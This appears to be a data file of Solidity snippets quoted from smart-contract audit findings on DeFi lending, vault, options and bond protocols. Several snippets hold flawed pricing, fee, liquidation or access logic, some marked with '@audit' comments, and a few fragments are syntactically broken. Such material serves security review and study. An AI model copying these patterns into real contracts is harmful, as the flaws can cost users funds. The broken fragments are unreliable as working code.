"```\nfunction _underlyingPoolContext(ILinearPool underlyingPool) private view returns (UnderlyingPoolContext memory) {\n    (uint256 lowerTarget, uint256 upperTarget) = underlyingPool.getTargets();\n    uint256 mainIndex = underlyingPool.getMainIndex();\n    uint256 wrappedIndex = underlyingPool.getWrappedIndex();\n\n    (\n        uint256[] memory tokens,\n        uint256[] memory underlyingBalances,\n        uint256 lastChangeBlock\n    ) = Deployments.BALANCER_VAULT.getPoolTokens(underlyingPool.getPoolId());\n\n    uint256[] memory underlyingScalingFactors = underlyingPool.getScalingFactors();\n    uint256 wrappedScaleFactor = underlyingScalingFactors[mainIndex] * underlyingPool.getWrappedTokenRate() / \n        BalancerConstants.BALANCER_PRECISION;\n\n    return UnderlyingPoolContext({\n        mainScaleFactor: underlyingScalingFactors[mainIndex],\n        mainBalance: underlyingBalances[mainIndex],\n        wrappedScaleFactor: wrappedScaleFactor,\n        wrappedBalance: underlyingBalances[wrappedIndex],\n        virtualSupply: underlyingPool.getVirtualSupply(),\n        fee: underlyingPool.getSwapFeePercentage(),\n        lowerTarget: lowerTarget,\n        upperTarget: upperTarget\n    });\n}\n```\nscalingFactors[_wrappedIndex] = \n    _scalingFactorWrappedToken.mulDown(_getWrappedTokenRate())\n```\n```\nfunction _scalingFactor(IERC20 token) internal view virtual returns (uint256) {\n    if (token == _mainToken) {\n        return _scalingFactorMainToken;\n    } else if (token == _wrappedToken) {\n        return _scalingFactorWrappedToken.mulDown(_getWrappedTokenRate());\n    } else if (token == this) {\n        return FixedPoint.ONE;\n    } else {\n        _revert(Errors.INVALID_TOKEN);\n    }\n}\n\n/**\n * @notice Return the scaling factors for all tokens, including the BPT.\n */\nfunction getScalingFactors() public view virtual override returns (uint256[] memory) {\n    uint256[] memory scalingFactors = new uint256[](_TOTAL_TOKENS);\n\n    scalingFactors[_mainIndex] = _scalingFactorMainToken;\n    scalingFactors[_wrappedIndex] = _scalingFactorWrappedToken.mulDown(_getWrappedTokenRate());\n    scalingFactors[_BPT_INDEX] = FixedPoint.ONE;\n\n    return scalingFactors;\n}\n```"
"```\nfunction _redeem(\n    ThreeTokenPoolContext memory poolContext,\n    StrategyContext memory strategyContext,\n    AuraStakingContext memory stakingContext,\n    uint256 strategyTokens,\n    uint256 minPrimary\n) internal returns (uint256 finalPrimaryBalance) {\n    uint256 bptClaim = strategyContext._convertStrategyTokensToBPTClaim(strategyTokens);\n\n    if (bptClaim == 0) {\n        return 0;\n    }\n\n    finalPrimaryBalance = _unstakeAndExitPool({\n        stakingContext: stakingContext,\n        poolContext: poolContext,\n        bptClaim: bptClaim,\n        minPrimary: minPrimary\n    });\n\n    strategyContext.vaultState.totalBPTHeld -= bptClaim;\n    strategyContext.vaultState.totalStrategyTokenGlobal -= uint256(strategyTokens);\n    strategyContext.vaultState.setStrategyVaultState();\n}\n```"
"```\nabstract contract MetaStable2TokenVaultMixin is TwoTokenPoolMixin {\n    constructor(NotionalProxy notional_, AuraVaultDeploymentParams memory params)\n        TwoTokenPoolMixin(notional_, params)\n    {\n        (/* */, /* */, /* */, /* */, bool oracleEnabled) = \n            IMetaStablePool(address(BALANCER_POOL_TOKEN)).getOracleMiscData();\n        require(oracleEnabled);\n    }\n```"
```\nrequire(oraclePrice >= 0);\n```\n```\noraclePrice = (oracleDecimals * oracleDecimals) / oraclePrice;\n```\nrequire(decimals >= 0);\n\nif (uint256(decimals)!= BalancerConstants.BALANCER_PRECISION) {\n    rate = (rate * int256(BalancerConstants.BALANCER_PRECISION)) / decimals;\n}\n```\n```\nrequire(oracleDecimals >= 0);\n```\n```\nlimitAmount = (\n    (oraclePrice + \n        ((oraclePrice * uint256(slippageLimit)) / \n            Constants.SLIPPAGE_LIMIT_PRECISION)) * \n    amount) / \n    oracleDecimals;\n```\n```\nreturn (pvInternal * borrowTokenDecimals * rate) / \n    (rateDecimals * int256(Constants.INTERNAL_TOKEN_PRECISION));\n```
"```\nuint256 amountOut; // amount received by trade\nbool stablePool; // if the traded pool is stable or volatile\n\n(amountOut, stablePool) = router.getAmountOut(HUNDRED_TOKENS, token1, USDC);\nrequire(stablePool == stable, ""pricing occuring through wrong pool"");\n```"
"```\nfunction _checkIfCollateralIsActive(bytes32 _currencyKey) internal view override {\n    ILiquidityPoolAvalon LiquidityPool = ILiquidityPoolAvalon(collateralBook.liquidityPoolOf(_currencyKey));\n    bool isStale;\n    uint circuitBreakerExpiry;\n\n    (, isStale, circuitBreakerExpiry) = LiquidityPool.getTokenPriceWithCheck();\n    require(!(isStale), ""Global Cache Stale, can't trade"");\n    require(circuitBreakerExpiry < block.timestamp, ""Lyra Circuit Breakers active, can't trade"");\n}"
"```\nfunction withdrawFromGauge(uint256 _NFTId, address[] memory _tokens) public {\n    uint256 amount = depositReceipt.pooledTokens(_NFTId);\n    depositReceipt.burn(_NFTId);\n    gauge.getReward(address(this), _tokens);\n    gauge.withdraw(amount);\n    AMMToken.transfer(msg.sender, amount);\n}\n```\n```\nfunction burn(uint256 _NFTId) external onlyMinter {\n    require(_isApprovedOrOwner(msg.sender, _NFTId), ""ERC721: caller is not token owner or approved"");\n    delete pooledTokens[_NFTId];\n    delete relatedDepositor[_NFTId];\n    _burn(_NFTId);\n}\n```"
"```\nuint256 amountOut;  # amount received by trade\nbool stablePool;  # if the traded pool is stable or volatile\n\n(amountOut, stablePool) = router.getAmountOut(HUNDRED_TOKENS, token1, USDC)\n```\n```\nfunction _priceCollateral(IDepositReceipt depositReceipt, uint256 _NFTId) internal view returns (uint256) {\n    uint256 pooledTokens = depositReceipt.pooledTokens(_NFTId);\n    return depositReceipt.priceLiquidity(pooledTokens);\n}\n\nfunction totalCollateralValue(address _collateralAddress, address _owner) public view returns (uint256) {\n    NFTids memory userNFTs = loanNFTids[_collateralAddress][_owner];\n    IDepositReceipt depositReceipt = IDepositReceipt(_collateralAddress);\n    uint256 totalPooledTokens;\n    for (uint256 i = 0; i < NFT_LIMIT; i++) {\n        if (userNFTs.ids[i]!= 0) {\n            totalPooledTokens += depositReceipt.pooledTokens(userNFTs.ids[i]);\n        }\n    }\n    return depositReceipt.priceLiquidity(totalPooledTokens);\n}\n```"
"```\nfunction priceCollateralToUSD(bytes32 _currencyKey, uint256 _amount) public view override returns(uint256) {\n    ILiquidityPoolAvalon LiquidityPool = ILiquidityPoolAvalon(collateralBook.liquidityPoolOf(_currencyKey));\n    uint256 tokenPrice = LiquidityPool.getTokenPrice();\n    uint256 withdrawalFee = _getWithdrawalFee(LiquidityPool);\n    uint256 USDValue = (_amount * tokenPrice) / LOAN_SCALE;\n    uint256 USDValueAfterFee = USDValue * (LOAN_SCALE - withdrawalFee) / LOAN_SCALE;\n    return USDValueAfterFee;\n}\n```\nfunction _getTotalBurnableTokens()\n    internal\n    returns (\n        uint tokensBurnable,\n        uint tokenPriceWithFee,\n        bool stale\n    ) {\n    uint burnableLiquidity;\n    uint tokenPrice;\n    (tokenPrice, stale, burnableLiquidity) = _getTokenPriceAndStale();\n\n    if (optionMarket.getNumLiveBoards()!= 0) {\n        tokenPriceWithFee = tokenPrice.multiplyDecimal(DecimalMath.UNIT - lpParams.withdrawalFee);\n    } else {\n        tokenPriceWithFee = tokenPrice;\n    }\n\n    return (burnableLiquidity.divideDecimal(tokenPriceWithFee), tokenPriceWithFee, stale);\n}\n```"
"```\nuint256 totalUserCollateral = totalCollateralValue(_collateralAddress, _loanHolder);\n\nuint256 proposedLiquidationAmount;\n\n{\n    uint256 liquidationAmount = viewLiquidatableAmount(totalUserCollateral, 1 ether, isoUSDBorrowed, liquidatableMargin);\n    require(liquidationAmount > 0, ""Loan not liquidatable"");\n    proposedLiquidationAmount = _calculateProposedReturnedCapital(_collateralAddress, _loanNFTs, _partialPercentage);\n    require(proposedLiquidationAmount <= liquidationAmount, ""excessive liquidation suggested"");\n}\n\nuint256 isoUSDreturning = proposedLiquidationAmount * LIQUIDATION_RETURN / LOAN_SCALE;\n\nif (proposedLiquidationAmount >= totalUserCollateral) {\n    // @audit bad debt cleared here\n}\n```\n```\nfunction totalCollateralValue(address _collateralAddress, address _owner) public view returns(uint256) {\n    NFTids memory userNFTs = loanNFTids[_collateralAddress][_owner];\n    IDepositReceipt depositReceipt = IDepositReceipt(_collateralAddress);\n\n    uint256 totalPooledTokens;\n    for (uint256 i = 0; i < NFT_LIMIT; i++) {\n        if (userNFTs.ids[i]!= 0) {\n            totalPooledTokens += depositReceipt.pooledTokens(userNFTs.ids[i]);\n        }\n    }\n    return (depositReceipt.priceLiquidity(totalPooledTokens));\n}\n```\n```\nfunction _calculateProposedReturnedCapital(\n    address _collateralAddress, \n    CollateralNFTs calldata _loanNFTs, \n    uint256 _partialPercentage\n) internal view returns (uint256) {\n    uint256 proposedLiquidationAmount;\n    require(_partialPercentage <= LOAN_SCALE, ""partialPercentage greater than 100%"");\n    for (uint256 i = 0; i < NFT_LIMIT; i++) {\n        if (_loanNFTs.slots[i] < NFT_LIMIT) {\n            if ((i == NFT_LIMIT - 1) && (_partialPercentage > 0) && (_partialPercentage < LOAN_SCALE)) {\n                proposedLiquidationAmount +=\n                    (( _priceCollateral(IDepositReceipt(_collateralAddress), _loanNFTs.ids[i]) \n                    * _partialPercentage) / LOAN_SCALE);\n            } else {\n                proposedLiquidationAmount += _priceCollateral(IDepositReceipt(_collateralAddress), _loanNFTs.ids[i]);\n            }\n        }\n    }\n    return proposedLiquidationAmount;\n}\n```"
"```\nIAccessControlledOffchainAggregator aggregator = IAccessControlledOffchainAggregator(priceFeed.aggregator());\n\ntokenMinPrice = aggregator.minAnswer();\ntokenMaxPrice = aggregator.maxAnswer();\n\nuint256 oraclePrice = getOraclePrice(priceFeed, tokenMaxPrice, tokenMinPrice);\n\nfunction getOraclePrice(IAggregatorV3 _priceFeed, int192 _maxPrice, int192 _minPrice) public view returns (uint256) {\n    (\n        /*uint80 roundID*/,\n        int signedPrice,\n        /*uint startedAt*/,\n        uint timeStamp,\n        /*uint80 answeredInRound*/\n    ) = _priceFeed.latestRoundData();\n\n    require(signedPrice > 0, ""Negative Oracle Price"");\n    require(timeStamp >= block.timestamp - HEARTBEAT_TIME, ""Stale pricefeed"");\n    require(signedPrice < _maxPrice, ""Upper price bound breached"");\n    require(signedPrice > _minPrice, ""Lower price bound breached"");\n}\n```\nfunction confirmAggregator(address _aggregator)\n    external\n    onlyOwner()\n{\n    require(_aggregator == address(proposedAggregator), ""Invalid proposed aggregator"");\n    delete proposedAggregator;\n    setAggregator(_aggregator);\n}\n\nfunction setAggregator(address _aggregator)\n    internal\n{\n    uint16 id = currentPhase.id + 1;\n    currentPhase = Phase(id, AggregatorV2V3Interface(_aggregator));\n    phaseAggregators[id] = AggregatorV2V3Interface(_aggregator);\n}\n\nfunction aggregator()\n    external\n    view\n    returns (address)\n{\n    return address(currentPhase.aggregator);\n}\n```"
"```\nfunction priceCollateralToUSD(bytes32 _currencyKey, uint256 _amount) public view override returns(uint256) {\n    ILiquidityPoolAvalon LiquidityPool = ILiquidityPoolAvalon(collateralBook.liquidityPoolOf(_currencyKey));\n    uint256 tokenPrice = LiquidityPool.getTokenPrice();\n    uint256 withdrawalFee = _getWithdrawalFee(LiquidityPool);\n    uint256 USDValue = (_amount * tokenPrice) / LOAN_SCALE;\n    uint256 USDValueAfterFee = USDValue * (LOAN_SCALE - withdrawalFee) / LOAN_SCALE;\n    return USDValueAfterFee;\n}"
"```\nif (outstandingisoUSD >= TENTH_OF_CENT) { // ignore leftover debts less than $0.001\n    uint256 collateralLeft = collateralPosted[_collateralAddress][msg.sender] - _collateralToUser;\n    uint256 colInUSD = priceCollateralToUSD(currencyKey, collateralLeft);\n    uint256 borrowMargin = (outstandingisoUSD * minOpeningMargin) / LOAN_SCALE;\n    require(colInUSD > borrowMargin, ""Remaining debt fails to meet minimum margin!"");\n}\n```"
"```\nfunction openLoan() external override whenNotPaused {\n    uint256 colInUSD = priceCollateralToUSD(currencyKey, _colAmount + collateralPosted[_collateralAddress][msg.sender]);\n    uint256 totalUSDborrowed = _USDborrowed + (isoUSDLoaned[_collateralAddress][msg.sender] * virtualPrice) / LOAN_SCALE;\n    // @audit should be isoUSDLoanAndInterest[_collateralAddress][msg.sender]\n    require(totalUSDborrowed >= ONE_HUNDRED_DOLLARS, ""Loan Requested too small"");\n    uint256 borrowMargin = (totalUSDborrowed * minOpeningMargin) / LOAN_SCALE;\n    require(colInUSD >= borrowMargin, ""Minimum margin not met!"");\n}\n```"
"```\nfunction withdrawFromGauge(uint256 _NFTId, address[] memory _tokens) public {\n    uint256 amount = depositReceipt.pooledTokens(_NFTId);\n    depositReceipt.burn(_NFTId);\n    gauge.getReward(address(this), _tokens);\n    gauge.withdraw(amount);\n    AMMToken.transfer(msg.sender, amount);\n}\n```"
"```\nfunction _updateVirtualPrice(uint256 _currentBlockTime, address _collateralAddress) internal {\n    (\n        uint256 interestPer3Min,\n        uint256 lastUpdateTime,\n        uint256 virtualPrice,\n       ,\n       ,\n        uint256\n    ) = _getCollateral(_collateralAddress);\n\n    uint256 timeDelta = _currentBlockTime - lastUpdateTime;\n\n    //exit gracefully if two users call the function for the same collateral in the same 3min period\n    uint256 threeMinuteDelta = timeDelta / 180;\n\n    if (threeMinuteDelta > 0) {\n        for (uint256 i = 0; i < threeMinuteDelta; i++) {\n            virtualPrice = (virtualPrice * interestPer3Min) / LOAN_SCALE;\n        }\n        collateralBook.vaultUpdateVirtualPriceAndTime(_collateralAddress, virtualPrice, _currentBlockTime);\n    }\n}\n```"
"```\nfunction getOraclePrice(IAggregatorV3 _priceFeed, int192 _maxPrice, int192 _minPrice) public view returns (uint256) {\n    (\n        uint80 roundID,\n        int signedPrice,\n        uint startedAt,\n        uint timeStamp,\n        uint80 answeredInRound\n    ) = _priceFeed.latestRoundData();\n\n    require(signedPrice > 0, ""Negative Oracle Price"");\n    require(timeStamp >= block.timestamp - HEARTBEAT_TIME, ""Stale pricefeed"");\n\n    require(signedPrice < _maxPrice, ""Upper price bound breached"");\n    require(signedPrice > _minPrice, ""Lower price bound breached"");\n\n    uint256 price = uint256(signedPrice);\n    return price;\n}\n```\n```\nuint256 outstandingisoUSD = isoUSDdebt - _USDToVault;\n\nuint256 colInUSD = _calculateProposedReturnedCapital(_collateralAddress, _loanNFTs, _partialPercentage);\n\nif (outstandingisoUSD >= TENTH_OF_CENT) { // ignore debts less than $0.001\n    uint256 collateralLeft = totalCollateralValue(_collateralAddress, msg.sender) - colInUSD;\n    uint256 borrowMargin = (outstandingisoUSD * minOpeningMargin) / LOAN_SCALE;\n    require(collateralLeft > borrowMargin, ""Remaining debt fails to meet minimum margin!"");\n}\n```"
"```\nfunction pauseCollateralType(\n    address _collateralAddress,\n    bytes32 _currencyKey\n) external collateralExists(_collateralAddress) onlyAdmin {\n    require(_collateralAddress!= address(0));\n    require(_currencyKey == collateralProps[_collateralAddress].currencyKey, ""Mismatched data"");\n    collateralValid[_collateralAddress] = false;\n    collateralPaused[_collateralAddress] = true;\n}\n```"
"```\nrequire(colInUSD >= borrowMargin, ""Liquidation margin not met!"")"
"```\nfunction priceCollateralToUSD(bytes32 _currencyKey, uint256 _amount) public view override returns(uint256) {\n    return (synthetixExchangeRates.effectiveValue(_currencyKey, _amount, SUSD_CODE));\n}\n```"
```\nuint256 constant ISOUSD_TIME_DELAY = 3; // days\n```\n```\nuint256 public constant CHANGE_COLLATERAL_DELAY = 200; // 2 days
```\nbalance = (\n    elapsedTime_ * \n    (RATE_DECIMALS_MULTIPLIER * tokenAmount_ / duration) / \n    RATE_DECIMALS_MULTIPLIER\n)
"```\ncontract StreamReceiveETHTest is StreamTest {\n\n    function setUp() public override {\n        super.setUp();\n    }\n\n    function test_receiveETH() public {\n        s = Stream(\n            factory.createStream(\n                payer, recipient, STREAM_AMOUNT, address(token), startTime, stopTime\n            )\n        );\n\n        vm.deal(payer, 10 ether);\n        vm.prank(payer);\n        (bool success, ) = address(s).call{value: 1 ether}("""");\n        assertEq(success, true);\n        assertEq(address(s).balance, 1 ether);\n    }\n}\n```\n```\nRunning 1 test for test/Stream.t.sol:StreamReceiveETHTest\n[PASS] test_receiveETH() (gas: 167691)\nTest result: ok. 1 passed; 0 failed; finished in 1.25ms\n```"
"```\nfunction cancel() external onlyPayerOrRecipient {\n    address payer_ = payer();\n    address recipient_ = recipient();\n    IERC20 token_ = token();\n\n    uint256 recipientBalance = balanceOf(recipient_);\n\n    remainingBalance = 0;\n\n    if (recipientBalance > 0) {\n        token_.safeTransfer(recipient_, recipientBalance);\n    }\n```"
"```\nwhile (_quantity > 0) {\n    Receipt memory deposit = deposits[i];\n    if (deposit.amount == 0) {\n        i++;\n        continue;\n    }\n    if (deposit.amount <= _quantity) {\n        _quantity = _quantity - deposit.amount;\n        usdBalance[deposit.sender] -= deposit.amount;\n        amountToSend = (deposit.amount * 1e18) / _price;\n        IERC20(crab).transfer(deposit.sender, amountToSend);\n        emit USDCDeposited(deposit.sender, deposit.amount, amountToSend, i, 0);\n        delete deposits[i];\n        i++;\n    } else {\n        deposits[i].amount = deposit.amount - _quantity;\n        usdBalance[deposit.sender] -= _quantity;\n        amountToSend = (_quantity * 1e18) / _price;\n        IERC20(crab).transfer(deposit.sender, amountToSend);\n        emit USDCDeposited(deposit.sender, _quantity, amountToSend, i, 0);\n        _quantity = 0;\n    }\n}\n```"
"```\nfunction _openQueuedTrade(uint256 queueId, uint256 price) internal {\n    if (revisedFee < queuedTrade.totalFee) {\n        tokenX.transfer(\n            queuedTrade.user,\n            queuedTrade.totalFee - revisedFee\n        );\n    }\n\n    queuedTrade.isQueued = false;\n}"
"```\n(uint256 unitFee,, ) = _fees(10**decimals(), settlementFeePercentage);\namount = (newFee * 10**decimals()) / unitFee;\n```"
"```\nfunction _validateSigner(\n    uint256 timestamp,\n    address asset,\n    uint256 price,\n    bytes memory signature\n) internal view returns (bool) {\n    bytes32 digest = ECDSA.toEthSignedMessageHash(\n        keccak256(abi.encodePacked(timestamp, asset, price))\n    );\n    address recoveredSigner = ECDSA.recover(digest, signature);\n    return recoveredSigner == publisher;\n}\n```"
"```\nfor (uint32 index = 0; index < params.length; index++) {\n    OpenTradeParams memory currentParams = params[index];\n    QueuedTrade memory queuedTrade = queuedTrades[currentParams.queueId];\n    bool isSignerVerified = _validateSigner(\n        currentParams.timestamp,\n        currentParams.asset,\n        currentParams.price,\n        currentParams.signature\n    );\n    if (!isSignerVerified) {\n        emit FailResolve(currentParams.queueId, ""Router: Signature didn't match"");\n        continue;\n    }\n    if (\n       !queuedTrade.isQueued ||\n        currentParams.timestamp!= queuedTrade.queuedTime\n    ) {\n        // Trade has already been opened or cancelled or the timestamp is wrong.\n        // So ignore this trade.\n        continue;\n    }\n\n    if (block.timestamp - queuedTrade.queuedTime <= MAX_WAIT_TIME) {\n        _openQueuedTrade(currentParams.queueId, currentParams.price);\n    } else {\n        _cancelQueuedTrade(currentParams.queueId);\n        emit CancelTrade(queuedTrade.user, currentParams.queueId, ""Wait time too high"");\n    }\n\n    userNextQueueIndexToProcess[queuedTrade.user] =\n        queuedTrade.userQueueIndex + 1;\n}\n```\n```\nfunction _openQueuedTrade(uint256 queueId, uint256 price) internal {\n    QueuedTrade storage queuedTrade = queuedTrades[queueId];\n    IBufferBinaryOptions optionsContract = IBufferBinaryOptions(\n        queuedTrade.targetContract\n    );\n\n    bool isSlippageWithinRange = optionsContract.isStrikeValid(\n        queuedTrade.slippage,\n        price,\n        queuedTrade.expectedStrike\n    );\n\n    if (!isSlippageWithinRange) {\n        _cancelQueuedTrade(queueId);\n        emit CancelTrade(\n            queuedTrade.user,\n            queueId,\n            ""Slippage limit exceeds""\n        );\n        return;\n    }\n\n    optionParams.totalFee = revisedFee;\n    optionParams.strike = price;\n    optionParams.amount = amount;\n\n    uint256 optionId = optionsContract.createFromRouter(\n        optionParams,\n        isReferralValid\n    );\n}\n```"
```\nfunction totalTokenXBalance()\n    public\n    view\n    override\n    returns (uint256 balance)\n{\n    return tokenX.balanceOf(address(this)) - lockedPremium;\n}\n```
"```\nrequire(\n    balance + tokenXAmount <= maxLiquidity,\n    ""Pool has already reached its max limit""\n);\n```"
"```\nfunction transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\n    var _allowance = allowed[_from][msg.sender];\n\n    uint fee = (_value.mul(basisPointsRate)).div(10000);\n    if (fee > maximumFee) {\n        fee = maximumFee;\n    }\n    if (_allowance < MAX_UINT) {\n        allowed[_from][msg.sender] = _allowance.sub(_value);\n    }\n    uint sendAmount = _value.sub(fee);\n    balances[_from] = balances[_from].sub(_value);\n    balances[_to] = balances[_to].add(sendAmount);\n    if (fee > 0) {\n        balances[owner] = balances[owner].add(fee);\n        Transfer(_from, owner, fee);\n    }\n    Transfer(_from, _to, sendAmount);\n}\n```\n```\nfunction transferFrom(address _from, address _to, uint _value) returns (bool) {\n    if (balances[_from] >= _value && \n        allowed[_from][msg.sender] >= _value && \n        balances[_to] + _value >= balances[_to]) {\n        balances[_to] += _value;\n        balances[_from] -= _value;\n        allowed[_from][msg.sender] -= _value;\n        Transfer(_from, _to, _value);\n        return true;\n    } else {\n        return false;\n    }\n}\n```"
"```\n(uint256 unitFee,, ) = _fees(10**decimals(), settlementFeePercentage);\namount = (newFee * 10**decimals()) / unitFee;\n```"
"```\ntry {\n    IERC721(order.collection).safeTransferFrom(bear, bull, tokenId);\n} catch (bytes memory) {\n    // Transfer NFT to BvbProtocol\n    IERC721(order.collection).safeTransferFrom(bear, address(this), tokenId);\n    // Store that the bull has to retrieve it\n    withdrawableCollectionTokenId[order.collection][tokenId] = bull;\n}\n\nuint bearAssetAmount = order.premium + order.collateral;\nif (bearAssetAmount > 0) {\n    IERC20(order.asset).safeTransfer(bear, bearAssetAmount);\n}\n```\n```\nfunction withdrawToken(bytes32 orderHash, uint tokenId) public {\n    address collection = matchedOrders[uint(orderHash)].collection;\n\n    address recipient = withdrawableCollectionTokenId[collection][tokenId];\n\n    IERC721(collection).safeTransferFrom(address(this), recipient, tokenId);\n\n    withdrawableCollectionTokenId[collection][tokenId] = address(0);\n\n    emit WithdrawnToken(orderHash, tokenId, recipient);\n}\n```"
"```\nfunction reclaimContract(Order calldata order) public nonReentrant {\n    bytes32 orderHash = hashOrder(order);\n\n    uint contractId = uint(orderHash);\n\n    address bull = bulls[contractId];\n\n    require(block.timestamp > order.expiry, ""NOT_EXPIRED_CONTRACT"");\n    require(!settledContracts[contractId], ""SETTLED_CONTRACT"");\n    require(!reclaimedContracts[contractId], ""RECLAIMED_CONTRACT"");\n\n    uint bullAssetAmount = order.premium + order.collateral;\n    if (bullAssetAmount > 0) {\n        IERC20(order.asset).safeTransfer(bull, bullAssetAmount);\n    }\n\n    reclaimedContracts[contractId] = true;\n\n    emit ReclaimedContract(orderHash, order);\n}\n```"
"```\nfunction purchaseBond(\n    uint256 id_,\n    uint256 amount_,\n    uint256 minAmountOut_\n) external override returns (uint256 payout) {\n    if (msg.sender!= address(_teller)) revert Auctioneer_NotAuthorized();\n\n    BondMarket storage market = markets[id_];\n    BondTerms memory term = terms[id_];\n\n    if (market.callbackAddr!= address(0) &&!callbackAuthorized[market.owner])\n        revert Auctioneer_NotAuthorized();\n}\n```\nfunction pushOwnership(uint256 id_, address newOwner_) external override {\n    if (msg.sender!= markets[id_].owner) revert Auctioneer_OnlyMarketOwner();\n    newOwners[id_] = newOwner_;\n}\n```"
"```\nfunction marketPrice(uint256 id_) public view override returns (uint256) {\n    uint256 price = currentControlVariable(id_).mulDivUp(currentDebt(id_), markets[id_].scale);\n\n    return (price > markets[id_].minPrice)? price : markets[id_].minPrice;\n}\n```\n```\nfunction _currentMarketPrice(uint256 id_) internal view returns (uint256) {\n    BondMarket memory market = markets[id_];\n    return terms[id_].controlVariable.mulDiv(market.totalDebt, market.scale);\n}\n```"
"```\nFile: BondBaseCallback.sol\n\n/// @inheritdoc IBondCallback\nfunction whitelist(address teller_, uint256 id_) external override onlyOwner {\n    // Check that the market id is a valid, live market on the aggregator\n    try _aggregator.isLive(id_) returns (bool live) {\n        if (!live) revert Callback_MarketNotSupported(id_);\n    } catch {\n        revert Callback_MarketNotSupported(id_);\n    }\n\n    // Check that the provided teller is the teller for the market ID on the stored aggregator\n    // We could pull the teller from the aggregator, but requiring the teller to be passed in\n    // is more explicit about which contract is being whitelisted\n    if (teller_!= address(_aggregator.getTeller(id_))) revert Callback_TellerMismatch();\n\n    approvedMarkets[teller_][id_] = true;\n}\n```"
"```\nfunction payoutFor(\n    uint256 amount_,\n    uint256 id_,\n    address referrer_\n) public view override returns (uint256) {\n    uint256 fee = amount_.mulDiv(_teller.getFee(referrer_), 1e5);\n    uint256 payout = (amount_ - fee).mulDiv(markets[id_].scale, marketPrice(id_));\n\n    if (payout > markets[id_].maxPayout) {\n        revert Auctioneer_MaxPayoutExceeded();\n    } else {\n        return payout;\n    }\n}\n```\n```\npragma solidity ^0.8.0;\n\ninterface IBondAggregator {\n    function findMarketFor(\n        address payout_,\n        address quote_,\n        uint256 amountIn_,\n        uint256 minAmountOut_,\n        uint256 maxExpiry_\n    ) external view returns (uint256) {\n        uint256[] memory ids = marketsFor(payout_, quote_);\n        uint256 len = ids.length;\n        uint256[] memory payouts = new uint256[](len);\n\n        uint256 highestOut;\n        uint256 id = type(uint256).max; // set to max so an empty set doesn't return 0, the first index\n        uint48 vesting;\n        uint256 maxPayout;\n        IBondAuctioneer auctioneer;\n        for (uint256 i = 0; i < len; i++) {\n            auctioneer = marketsToAuctioneers[ids[i]];\n            (,,,, vesting, maxPayout) = auctioneer.getMarketInfoForPurchase(ids[i]);\n\n            uint256 expiry = (vesting <= MAX_FIXED_TERM)? block.timestamp + vesting : vesting;\n\n            if (expiry <= maxExpiry_) {\n                payouts[i] = minAmountOut_ <= maxPayout\n                   ? payoutFor(amountIn_, ids[i], address(0))\n                    : 0;\n\n                if (payouts[i] > highestOut) {\n                    highestOut = payouts[i];\n                    id = ids[i];\n                }\n            }\n        }\n\n        return id;\n    }\n}"
"```\nFile: BondBaseSDA.sol\n\nuint256 lastDecayIncrement = debtDecayInterval.mulDiv(payout_, lastTuneDebt);\nmetadata[id_].lastDecay += uint48(lastDecayIncrement);\n```"
"```\nexpiry = ((vesting_ + uint48(block.timestamp)) / uint48(1 days)) * uint48(1 days);\n\nuint256 tokenId = getTokenId(payoutToken_, expiry);\n\nif (!tokenMetadata[tokenId].active) {\n    _deploy(tokenId, payoutToken_, expiry);\n}\n```\n```\nfunction deploy(ERC20 underlying_, uint48 expiry_)\n    external\n    override\n    nonReentrant\n    returns (uint256)\n{\n    uint256 tokenId = getTokenId(underlying_, expiry_);\n    if (!tokenMetadata[tokenId].active) {\n        _deploy(tokenId, underlying_, expiry_);\n    }\n    return tokenId;\n}\n```\n```\nuint256 tokenId = uint256(\n    keccak256(\n        abi.encodePacked(\n            underlying_,\n            expiry_ / uint48(1 days)\n        )\n    )\n);\n```\n```\ntokenMetadata[tokenId_] = TokenMetadata(\n    True,\n    underlying_,\n    uint8(underlying_.decimals()),\n    expiry_,\n    0\n)"
```\nif (expiry_ < block.timestamp) {\n    revert Teller_InvalidParams();\n}\n```
"```\nfunction findMarketFor(\n    address payout_,\n    address quote_,\n    uint256 amountIn_,\n    uint256 minAmountOut_,\n    uint256 maxExpiry_\n) external view returns (uint256) {\n    if (expiry <= maxExpiry_) {\n        payouts[i] = minAmountOut_ <= maxPayout\n           ? payoutFor(amountIn_, ids[i], address(0))\n            : 0;\n\n        if (payouts[i] > highestOut) {\n            highestOut = payouts[i];\n            id = ids[i];\n        }\n    }\n```"
"```\nFile: BondBaseSDA.sol\n\nif (term.maxDebt < market.totalDebt) {\n    _close(id_);\n} else {\n    // If market will continue, the control variable is tuned to to expend remaining capacity over remaining market duration\n    _tune(id_, currentTime, price);\n}\n```"
"```\nFile: BondFixedExpiryTeller.sol\n\nif (protocolFee > createFeeDiscount) {\n    uint256 feeAmount = amount_.mulDiv(protocolFee - createFeeDiscount, FEE_DECIMALS);\n    rewards[_protocol][underlying_] += feeAmount;\n\n    bondToken.mint(msg.sender, amount_ - feeAmount);\n\n    return (bondToken, amount_ - feeAmount);\n} else {\n    bondToken.mint(msg.sender, amount_);\n    return (bondToken, amount_);\n}\n```\n```\nFile: BondFixedTermTeller.sol\n\nif (protocolFee > createFeeDiscount) {\n    uint256 feeAmount = amount_.mulDiv(protocolFee - createFeeDiscount, FEE_DECIMALS);\n    rewards[_protocol][underlying_] += feeAmount;\n\n    _mintToken(msg.sender, tokenId, amount_ - feeAmount);\n\n    return (tokenId, amount_ - feeAmount);\n} else {\n    _mintToken(msg.sender, tokenId, amount_);\n\n    return (tokenId, amount_);\n}\n```"
```\nfunction registerAuctioneer(IBondAuctioneer auctioneer_) external requiresAuth {\n    // Restricted to authorized addresses\n\n    if (_whitelist[address(auctioneer_)]) {\n        revert Aggregator_AlreadyRegistered(address(auctioneer_));\n    }\n\n    auctioneers.push(auctioneer_);\n    _whitelist[address(auctioneer_)] = true;\n}\n```
```\nfunction setDefaults(uint32[6] memory defaults_) external override requiresAuth {\n    defaultTuneInterval = defaults_[0];\n    defaultTuneAdjustment = defaults_[1];\n    minDebtDecayInterval = defaults_[2];\n    minDepositInterval = defaults_[3];\n    minMarketDuration = defaults_[4];\n    minDebtBuffer = defaults_[5];\n}\n```
